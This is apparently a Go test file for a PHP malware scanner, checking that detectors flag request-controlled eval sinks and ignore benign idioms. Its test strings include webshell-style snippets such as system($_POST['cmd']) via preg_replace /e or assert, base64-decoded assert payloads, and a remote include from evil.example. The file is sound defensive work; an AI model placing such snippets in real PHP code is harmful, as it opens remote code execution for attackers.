package checks

import (
	"strings"
	"testing"
)

const (
	indPregReplaceEval = "preg_replace with /e modifier (code execution)"
	indDangerousInc    = "include/require of request input or remote/data wrapper"
	indCodeEvalPrim    = "code-eval primitive (assert/create_function) with request input"
)

// --- preg_replace /e modifier (legacy eval sink, removed in PHP 7) ---
//
// The /e modifier evaluates the replacement as PHP with backreferences
// interpolated from the subject, so the call is an RCE sink only when attacker
// input reaches the replacement or subject. Bare /e with static arguments is
// the legacy WordPress serialize-fix / autolink idiom, not a dropper, so it is
// gated on request-input correlation -- matching the shell, include, and assert
// detectors.

func TestAnalyzePHPContentPregReplaceEvalReplacementRequestFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php preg_replace('/.*/e', $_POST['c'], $subject); ?>")
	if !strings.Contains(res.details, indPregReplaceEval) {
		t.Errorf("preg_replace /e with request replacement not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentPregReplaceEvalTaintedReplacementVariableFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php $code = $_POST['c']; preg_replace('/.*/e', $code, $subject); ?>")
	if !strings.Contains(res.details, indPregReplaceEval) {
		t.Errorf("preg_replace /e with tainted replacement variable not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentPregReplaceEvalReplacementCodeStringRequestFlagged(t *testing.T) {
	res := analyzePHPString(t, `<?php preg_replace('/.*/e', 'system($_POST["cmd"])', 'x'); ?>`)
	if !strings.Contains(res.details, indPregReplaceEval) {
		t.Errorf("preg_replace /e with request-reading replacement code not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentPregReplaceEvalReplacementCodeStringTaintedVariableFlagged(t *testing.T) {
	res := analyzePHPString(t, `<?php $cmd = $_POST["cmd"]; preg_replace('/.*/e', 'system($cmd)', 'x'); ?>`)
	if !strings.Contains(res.details, indPregReplaceEval) {
		t.Errorf("preg_replace /e with tainted variable inside replacement code not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentPregReplaceEvalSubjectRequestFlagged(t *testing.T) {
	// /e evals the replacement with backreferences taken from the subject, so a
	// request-controlled subject is just as exploitable as a request replacement.
	res := analyzePHPString(t, "<?php preg_replace('/.*/e', $repl, $_GET['data']); ?>")
	if !strings.Contains(res.details, indPregReplaceEval) {
		t.Errorf("preg_replace /e with request subject not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentPregReplaceEvalTaintedSubjectVariableFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php $subject = $_GET['data']; preg_replace('/.*/e', $repl, $subject); ?>")
	if !strings.Contains(res.details, indPregReplaceEval) {
		t.Errorf("preg_replace /e with tainted subject variable not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentPregReplaceEvalDoubleQuotedSubjectRequestFlagged(t *testing.T) {
	res := analyzePHPString(t, `<?php preg_replace('/.*/e', 'strtoupper("$0")', "$_POST[data]"); ?>`)
	if !strings.Contains(res.details, indPregReplaceEval) {
		t.Errorf("preg_replace /e with interpolated request subject not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentPregReplaceEvalAltDelimiterRequestFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php preg_replace('~payload~ie', $_POST['r'], $s); ?>")
	if !strings.Contains(res.details, indPregReplaceEval) {
		t.Errorf("preg_replace ~..~ie with request input not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentPregReplaceEvalPairedDelimitersRequestFlagged(t *testing.T) {
	for _, pattern := range []string{"{payload}e", "(payload)e", "[payload]e", "<payload>e"} {
		res := analyzePHPString(t, "<?php preg_replace('"+pattern+"', 'static', $_GET['s']); ?>")
		if !strings.Contains(res.details, indPregReplaceEval) {
			t.Errorf("preg_replace %q with request input not flagged; details=%q", pattern, res.details)
		}
	}
}

func TestAnalyzePHPContentPregReplaceEvalPatternRequestOnlyNotFlagged(t *testing.T) {
	res := analyzePHPString(t, `<?php preg_replace("/$_GET[p]/e", "'ok'", $subject); ?>`)
	if strings.Contains(res.details, indPregReplaceEval) {
		t.Errorf("preg_replace /e with request only in pattern wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentPregReplaceEvalSingleQuotedSubjectLiteralNotFlagged(t *testing.T) {
	res := analyzePHPString(t, `<?php preg_replace('/.*/e', '"ok"', '$_POST[data]'); ?>`)
	if strings.Contains(res.details, indPregReplaceEval) {
		t.Errorf("single-quoted subject literal wrongly treated as request input; details=%q", res.details)
	}
}

func TestAnalyzePHPContentPregReplaceEvalReassignedVariableNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php $code = $_POST['c']; $code = 'safe'; preg_replace('/.*/e', $code, $subject); ?>")
	if strings.Contains(res.details, indPregReplaceEval) {
		t.Errorf("reassigned replacement variable wrongly treated as request input; details=%q", res.details)
	}
}

func TestAnalyzePHPContentPregReplaceEvalOtherFunctionTaintNotFlagged(t *testing.T) {
	body := "<?php\n" +
		"function store_request() { $code = $_POST['c']; }\n" +
		"function render($subject, $code) { return preg_replace('/.*/e', $code, $subject); }\n" +
		"?>"
	res := analyzePHPString(t, body)
	if strings.Contains(res.details, indPregReplaceEval) {
		t.Errorf("request variable from another function wrongly carried into preg_replace /e; details=%q", res.details)
	}
}

func TestAnalyzePHPContentPregReplaceEvalNoRequestNotFlagged(t *testing.T) {
	// The legacy WordPress serialize-fix and autolink idioms: real /e usage, but
	// the subject and replacement are internal data, not attacker input. These
	// are not droppers and must not flag.
	cases := []string{
		`<?php $r = preg_replace('!s:(\d+):"(.*?)";!e', "'s:'.strlen('$2').':\"$2\";'", $serial); ?>`,
		`<?php $v = preg_replace("#(^|[\n ])([\w]+?://[\w]+[^ \"\n\r\t<]*)#ise", "'\\1<a href=\"\\2\">\\2</a>'", $text); ?>`,
	}
	for _, content := range cases {
		res := analyzePHPString(t, content)
		if strings.Contains(res.details, indPregReplaceEval) {
			t.Errorf("static-argument /e idiom wrongly flagged; content=%q details=%q", content, res.details)
		}
	}
}

func TestAnalyzePHPContentPregReplaceNoEvalNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php preg_replace('/[a-z]+/i', 'x', $s); ?>")
	if strings.Contains(res.details, indPregReplaceEval) {
		t.Errorf("plain preg_replace wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentPregReplaceUppercaseEModifierNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php preg_replace('/[a-z]+/E', 'x', $s); ?>")
	if strings.Contains(res.details, indPregReplaceEval) {
		t.Errorf("uppercase E modifier wrongly treated as eval; details=%q", res.details)
	}
}

func TestAnalyzePHPContentPregReplaceEvalInStringNotFlagged(t *testing.T) {
	// A documentation/string example must not trip the scanner.
	res := analyzePHPString(t, "<?php $doc = \"preg_replace('/a/e', ...) is dangerous\"; echo $doc; ?>")
	if strings.Contains(res.details, indPregReplaceEval) {
		t.Errorf("preg_replace /e inside a string literal wrongly flagged; details=%q", res.details)
	}
}

// --- include/require of request input or remote/data wrappers (LFI/RFI) ---

func TestAnalyzePHPContentIncludeRequestFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php include($_GET['page'].'.php'); ?>")
	if !strings.Contains(res.details, indDangerousInc) {
		t.Errorf("include of request input not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentIncludeMultilineRequestFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php include(\n$_GET['page'].'.php'\n); ?>")
	if !strings.Contains(res.details, indDangerousInc) {
		t.Errorf("multiline include of request input not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentIncludePHPWrapperFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php include 'php://input'; ?>")
	if !strings.Contains(res.details, indDangerousInc) {
		t.Errorf("include of php:// wrapper not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentRequireRemoteFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php require_once('http://evil.example/x.txt'); ?>")
	if !strings.Contains(res.details, indDangerousInc) {
		t.Errorf("require of remote URL not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentStaticIncludeNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php require_once ABSPATH . 'wp-load.php'; include __DIR__.'/config.php'; ?>")
	if strings.Contains(res.details, indDangerousInc) {
		t.Errorf("static include wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentStaticIncludeSameLineRequestNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php include __DIR__.'/config.php'; $page = $_GET['page']; ?>")
	if strings.Contains(res.details, indDangerousInc) {
		t.Errorf("static include with unrelated request read wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentStaticIncludeNextLineRequestNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php include __DIR__.'/config.php';\n$page = $_GET['page']; ?>")
	if strings.Contains(res.details, indDangerousInc) {
		t.Errorf("static include with next-line request read wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentStaticIncludeSameLineRemoteStringNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php include __DIR__.'/config.php'; $url = 'http://example.test/feed'; ?>")
	if strings.Contains(res.details, indDangerousInc) {
		t.Errorf("static include with unrelated remote string wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentIncludeVariableNameNotFlagged(t *testing.T) {
	// A variable named $include fed request input is not an include statement.
	res := analyzePHPString(t, "<?php $include = $_GET['x']; echo $include; ?>")
	if strings.Contains(res.details, indDangerousInc) {
		t.Errorf("variable named $include wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentIncludeMethodNameNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php $loader->include($_GET['x']); ?>")
	if strings.Contains(res.details, indDangerousInc) {
		t.Errorf("method named include wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentIncludeInStringNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php $doc = \"include $_GET['page']\"; ?>")
	if strings.Contains(res.details, indDangerousInc) {
		t.Errorf("include inside string literal wrongly flagged; details=%q", res.details)
	}
}

// TestAnalyzePHPContentCallUserFuncConcatOnlyNotFlagged guards the
// call_user_func+decoder obfuscation indicator against a concat-only false
// positive: a large minified plugin that uses call_user_func_array, an
// unrelated base64_decode, and heavy string concatenation must not trip it.
// Hex-encoded function-name building (the real obfuscation signal) still does.
func TestAnalyzePHPContentCallUserFuncConcatOnlyNotFlagged(t *testing.T) {
	body := "<?php\n" +
		"call_user_func_array($cb, $args);\n" +
		"$x = base64_decode($data);\n" +
		"$s = \"a\" . \"b\" . \"c\" . \"d\" . \"e\" . \"f\" . \"g\";\n" +
		"?>"
	res := analyzePHPString(t, body)
	if strings.Contains(res.details, "variable function call with decoder and obfuscation") {
		t.Errorf("concat-only call_user_func/decoder wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentCallUserFuncUnrelatedHexNotFlagged(t *testing.T) {
	body := "<?php\n" +
		"call_user_func_array($cb, $args);\n" +
		"$x = base64_decode($data);\n" +
		"$zip = [\"\\x50\", \"\\x4b\", \"\\x03\", \"\\x04\", \"\\x14\", \"\\x00\"];\n" +
		"?>"
	res := analyzePHPString(t, body)
	if strings.Contains(res.details, "variable function call with decoder and obfuscation") {
		t.Errorf("unrelated hex literals wrongly flagged as call_user_func obfuscation; details=%q", res.details)
	}
}

func TestAnalyzePHPContentCallUserFuncReassignedHexNameNotFlagged(t *testing.T) {
	body := "<?php\n" +
		"$name = \"\\x63\" . \"\\x75\" . \"\\x72\";\n" +
		"$name = $cb;\n" +
		"$x = base64_decode($data);\n" +
		"call_user_func($name, $x);\n" +
		"?>"
	res := analyzePHPString(t, body)
	if strings.Contains(res.details, "variable function call with decoder and obfuscation") {
		t.Errorf("reassigned hex-built callback name wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentCallUserFuncCompoundReassignedHexNameNotFlagged(t *testing.T) {
	body := "<?php\n" +
		"$name = \"\\x63\" . \"\\x75\" . \"\\x72\";\n" +
		"$name += 1;\n" +
		"$x = base64_decode($data);\n" +
		"call_user_func($name, $x);\n" +
		"?>"
	res := analyzePHPString(t, body)
	if strings.Contains(res.details, "variable function call with decoder and obfuscation") {
		t.Errorf("compound-reassigned hex-built callback name wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentCallUserFuncAppendHexNameFlagged(t *testing.T) {
	body := "<?php\n" +
		"$name = \"\";\n" +
		"$name .= \"\\x63\";\n" +
		"$name .= \"\\x75\";\n" +
		"$name .= \"\\x72\";\n" +
		"$x = base64_decode($data);\n" +
		"call_user_func($name, $x);\n" +
		"?>"
	res := analyzePHPString(t, body)
	if !strings.Contains(res.details, "variable function call with decoder and obfuscation") {
		t.Errorf("appended hex-built callback name not flagged; details=%q", res.details)
	}
}

// --- assert / create_function code-eval primitives with request input ---

func TestAnalyzePHPContentAssertRequestFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php assert($_POST['code']); ?>")
	if !strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert with request input not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertWhitespaceRequestFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php assert ($_POST['code']); ?>")
	if !strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert with whitespace before paren not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentCreateFunctionRequestFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php $f = create_function('$x', $_GET['body']); ?>")
	if !strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("create_function with request input not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentCreateFunctionWhitespaceRequestFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php $f = create_function ('$x', $_GET['body']); ?>")
	if !strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("create_function with whitespace before paren not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertNoRequestNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php assert(count($items) > 0); ?>")
	if strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert without request input wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertSameLineUnrelatedRequestNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php assert(count($items) > 0); $page = $_GET['page']; ?>")
	if strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert with unrelated same-line request read wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertInStringNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php $doc = \"assert($_GET['code'])\"; ?>")
	if strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert inside string literal wrongly flagged; details=%q", res.details)
	}
}

// --- assert argument type classification: only string-capable arguments are
// code-eval sinks; provably-boolean/int expressions are not ---

func TestAnalyzePHPContentAssertBoolBuiltinWithRequestNotFlagged(t *testing.T) {
	// Upstream qtranslate-xt 3.16.1 admin_options_update.php:884 shape:
	// assert(file_exists(...)) evaluates to bool, never an attacker string.
	res := analyzePHPString(t, "<?php assert( file_exists( QTRANSLATE_DIR . '/css/lsb/' . $_POST['lsb_style'] ) ); ?>")
	if strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert(file_exists(...)) wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertInArrayWithRequestNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php assert(in_array($_POST['mode'], $allowed, true)); ?>")
	if strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert(in_array(...)) wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertComparisonWithRequestNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php assert(strpos($_GET['url'], '/') === 0); ?>")
	if strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert with top-level comparison wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertLogicalAndWithRequestNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php assert(isset($_POST['style']) && $_POST['style'] !== ''); ?>")
	if strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert with logical-and wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertNegationWithRequestNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php assert(!$_POST['debug']); ?>")
	if strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert(!...) wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertQualifiedBuiltinWithRequestNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php assert(\\is_string($_GET['name'])); ?>")
	if strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert(\\is_string(...)) wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertPregMatchWithRequestNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php assert(preg_match('/^[a-z]+$/', $_POST['slug'])); ?>")
	if strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert(preg_match(...)) wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertParenWrappedBoolWithRequestNotFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php assert((is_file($_POST['p']))); ?>")
	if strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert((is_file(...))) wrongly flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertClosureUseElsewhereStillNotFlagged(t *testing.T) {
	// A closure capture (use ($ctx)) is not a function alias import and must
	// not disable trust in unqualified builtin names.
	body := "<?php\n" +
		"$f = function () use ($ctx) { return 1; };\n" +
		"assert(is_file($_POST['p']));\n" +
		"?>"
	res := analyzePHPString(t, body)
	if strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("closure use() disabled builtin trust; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertStringBuiltinWithRequestFlagged(t *testing.T) {
	// base64_decode returns a string: assert(base64_decode($_POST[...])) is
	// the classic eval-less webshell on PHP < 8.
	res := analyzePHPString(t, "<?php assert(base64_decode($_POST['c'])); ?>")
	if !strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert(base64_decode(...)) not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertUnknownFunctionWithRequestFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php assert(my_decode($_POST['p'])); ?>")
	if !strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert(custom_fn(...)) not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertTernaryWithRequestFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php assert($_GET['a'] == '1' ? $_GET['b'] : 'x'); ?>")
	if !strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert with ternary not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertNullCoalesceWithRequestFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php assert($_POST['c'] ?? 'x'); ?>")
	if !strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert with null-coalesce not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertConcatWithRequestFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php assert('1' . $_GET['c']); ?>")
	if !strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert with concat not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertAssignmentWithRequestFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php assert($x = $_POST['c']); ?>")
	if !strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert with assignment not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertStringLiteralWithRequestFlagged(t *testing.T) {
	// A literal string argument is evaluated as PHP code by assert() < 8.0.
	res := analyzePHPString(t, "<?php assert('is_file($_POST[\"x\"])'); ?>")
	if !strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert('...code...') not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertNamespacedShadowFlagged(t *testing.T) {
	// In a namespaced file an unqualified file_exists() can resolve to an
	// attacker-defined shadow that returns its argument, so builtin trust is
	// withdrawn and the call stays flagged.
	body := "<?php\n" +
		"namespace x;\n" +
		"function file_exists($c) { return $c; }\n" +
		"assert(file_exists($_POST['c']));\n" +
		"?>"
	res := analyzePHPString(t, body)
	if !strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("namespaced builtin shadow not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertUseFunctionAliasFlagged(t *testing.T) {
	body := "<?php\n" +
		"use function evil\\passthrough as file_exists;\n" +
		"assert(file_exists($_POST['c']));\n" +
		"?>"
	res := analyzePHPString(t, body)
	if !strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("use-function alias shadow not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertGlobalBuiltinPolyfillFlagged(t *testing.T) {
	body := "<?php\n" +
		"function str_contains($haystack, $needle) { return $_POST['code']; }\n" +
		"assert(str_contains($_POST['haystack'], 'x'));\n" +
		"?>"
	res := analyzePHPString(t, body)
	if !strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("global builtin polyfill shadow not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertClassMethodNamedBuiltinNotShadow(t *testing.T) {
	body := "<?php\n" +
		"class Validator { function file_exists($path) { return $path; } }\n" +
		"assert(file_exists($_POST['p']));\n" +
		"?>"
	res := analyzePHPString(t, body)
	if strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("class method named builtin disabled global builtin trust; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertMethodNamedAndNotBooleanContext(t *testing.T) {
	// $obj->and(...) is a method call, not the logical operator; its return
	// value can be any string so the call stays flagged.
	res := analyzePHPString(t, "<?php assert($obj->and($_POST['c'])); ?>")
	if !strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("method named 'and' treated as boolean operator; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertUnbalancedParenWithRequestFlagged(t *testing.T) {
	// Splitting the call across lines must not dodge the detector.
	body := "<?php\n" +
		"assert(base64_decode($_POST['c'])\n" +
		");\n" +
		"?>"
	res := analyzePHPString(t, body)
	if !strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("multiline assert with request input not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertHeredocRequestCodeFlagged(t *testing.T) {
	body := "<?php\n" +
		"assert(<<<PHP\n" +
		"system($_POST['cmd']);\n" +
		"PHP\n" +
		");\n" +
		"?>"
	res := analyzePHPString(t, body)
	if !strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("heredoc assert code with request input not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertNowdocRequestCodeFlagged(t *testing.T) {
	body := "<?php\n" +
		"assert(<<<'PHP'\n" +
		"system($_POST['cmd']);\n" +
		"PHP\n" +
		");\n" +
		"?>"
	res := analyzePHPString(t, body)
	if !strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("nowdoc assert code with request input not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertMultilineRequestArgumentFlagged(t *testing.T) {
	body := "<?php\n" +
		"assert(\n" +
		"base64_decode($_POST['c'])\n" +
		");\n" +
		"?>"
	res := analyzePHPString(t, body)
	if !strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("multiline assert argument with request input not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentCreateFunctionMultilineRequestFlagged(t *testing.T) {
	body := "<?php\n" +
		"$f = create_function('$x',\n" +
		"$_GET['body']\n" +
		");\n" +
		"?>"
	res := analyzePHPString(t, body)
	if !strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("multiline create_function with request input not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertBitwiseOnStringsFlagged(t *testing.T) {
	// PHP bitwise operators on two strings yield a string, so the result can
	// be attacker-built code.
	cases := []string{
		"<?php assert($_POST['a'] & $_POST['b']); ?>",
		"<?php assert($_POST['a'] | $_POST['b']); ?>",
		"<?php assert($_POST['a'] ^ $_POST['b']); ?>",
	}
	for _, content := range cases {
		res := analyzePHPString(t, content)
		if !strings.Contains(res.details, indCodeEvalPrim) {
			t.Errorf("assert with string bitwise operator not flagged; content=%q details=%q", content, res.details)
		}
	}
}

func TestAnalyzePHPContentAssertArithmeticWithRequestNotFlagged(t *testing.T) {
	// Arithmetic and shifts coerce to numbers/integers, never strings, so
	// assert() cannot evaluate attacker-built PHP from the result.
	cases := []string{
		"<?php assert($_POST['n'] + 0); ?>",
		"<?php assert(0 - $_GET['n']); ?>",
		"<?php assert($_REQUEST['n'] * 1); ?>",
		"<?php assert($_COOKIE['n'] / 1); ?>",
		"<?php assert($_SERVER['CONTENT_LENGTH'] % 2); ?>",
		"<?php assert($_POST['n'] << 1); ?>",
		"<?php assert($_POST['n'] >> 1); ?>",
		"<?php assert(-$_POST['n']); ?>",
		"<?php assert($_POST['n'] + 1.5); ?>",
		"<?php assert($_POST['n'] + .5); ?>",
		"<?php assert($_POST['n'] + 1.); ?>",
		"<?php assert($_POST['n'] + 1.e2); ?>",
		"<?php assert($_POST['n'] + 1_000.5); ?>",
	}
	for _, content := range cases {
		res := analyzePHPString(t, content)
		if strings.Contains(res.details, indCodeEvalPrim) {
			t.Errorf("assert arithmetic/shift expression wrongly flagged; content=%q details=%q", content, res.details)
		}
	}
}

func TestAnalyzePHPContentAssertConcatAfterArithmeticFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php assert(($_POST['n'] + 0) . 'x'); ?>")
	if !strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert concat after arithmetic not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertConcatAfterShiftFlagged(t *testing.T) {
	cases := []string{
		"<?php assert($_POST['n'] << 1 . $_GET['code']); ?>",
		"<?php assert($_POST['n'] >> 1 . $_GET['code']); ?>",
	}
	for _, content := range cases {
		res := analyzePHPString(t, content)
		if !strings.Contains(res.details, indCodeEvalPrim) {
			t.Errorf("assert concat after shift not flagged; content=%q details=%q", content, res.details)
		}
	}
}

func TestAnalyzePHPContentAssertConcatAfterNumericLiteralFlagged(t *testing.T) {
	cases := []string{
		"<?php assert($_POST['n'] + 1.0.$_GET['code']); ?>",
		"<?php assert($_POST['n'] + 1e3.$_GET['code']); ?>",
		"<?php assert($_POST['n'] + 1e-3.$_GET['code']); ?>",
		"<?php assert($_POST['n'] + 0x1.$_GET['code']); ?>",
		"<?php assert($_POST['n'] + 0b1.$_GET['code']); ?>",
		"<?php assert($_POST['n'] + 1_000.0.$_GET['code']); ?>",
	}
	for _, content := range cases {
		res := analyzePHPString(t, content)
		if !strings.Contains(res.details, indCodeEvalPrim) {
			t.Errorf("assert concat after numeric literal not flagged; content=%q details=%q", content, res.details)
		}
	}
}

func TestAnalyzePHPContentAssertStringIncrementFlagged(t *testing.T) {
	res := analyzePHPString(t, "<?php assert(++$_POST['c']); ?>")
	if !strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert string increment not flagged; details=%q", res.details)
	}
}

func TestAnalyzePHPContentAssertRequestOnlyInDescriptionNotFlagged(t *testing.T) {
	// The second assert() argument is a description value, never evaluated as
	// code; only the first argument is a code-eval sink.
	res := analyzePHPString(t, "<?php assert(is_file($path), 'missing ' . $_GET['name']); ?>")
	if strings.Contains(res.details, indCodeEvalPrim) {
		t.Errorf("assert with request input only in description wrongly flagged; details=%q", res.details)
	}
}
